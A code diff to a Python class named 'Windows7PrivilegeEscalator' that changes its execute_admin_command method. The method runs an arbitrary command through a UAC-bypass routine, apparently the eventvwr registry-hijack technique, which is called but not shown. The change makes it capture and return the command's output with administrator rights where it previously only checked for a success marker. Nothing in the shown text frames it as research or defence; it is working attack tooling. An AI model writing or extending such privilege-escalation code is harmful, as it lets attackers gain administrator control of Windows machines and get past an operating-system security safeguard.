@@ -54,27 +54,35 @@ class Windows7PrivilegeEscalator:
             return False
     
     def execute_admin_command(self, command):
-        # Create verification file
-        marker_file = os.path.join(tempfile.gettempdir(), f"admin_exec_{int(time.time())}.txt")
+        """Execute admin command and capture actual output"""
+        # Create output file for command results
+        output_file = os.path.join(tempfile.gettempdir(), f"admin_output_{int(time.time())}.txt")
         
-        # Create payload with verification
-        payload = f'cmd.exe /c "{command} && echo ADMIN_EXEC_SUCCESS > {marker_file}"'
+        # Create payload that captures command output
+        payload = f'cmd.exe /c "{command} > {output_file} 2>&1"'
         
         # Execute using UAC bypass
         success = self.eventvwr_uac_bypass_confirmed(payload)
         
         if success:
-            time.sleep(8)
+            time.sleep(8)  # Wait for command execution
             
-            # Check for execution marker
-            if os.path.exists(marker_file):
+            # Read actual command output
+            if os.path.exists(output_file):
                 try:
-                    os.remove(marker_file)
-                    return True, "Command executed with administrator privileges"
-                except:
-                    return True, "Command executed (cleanup failed)"
+                    with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
+                        actual_output = f.read().strip()
+                    os.remove(output_file)
+                    
+                    if actual_output:
+                        return True, actual_output
+                    else:
+                        return True, "Command executed successfully (no output)"
+                        
+                except Exception as e:
+                    return True, f"Command executed but couldn't read output: {e}"
             else:
-                return False, "Command execution not confirmed"
+                return False, "Command execution not confirmed - no output file created"
         else:
             return False, "UAC bypass failed"
     
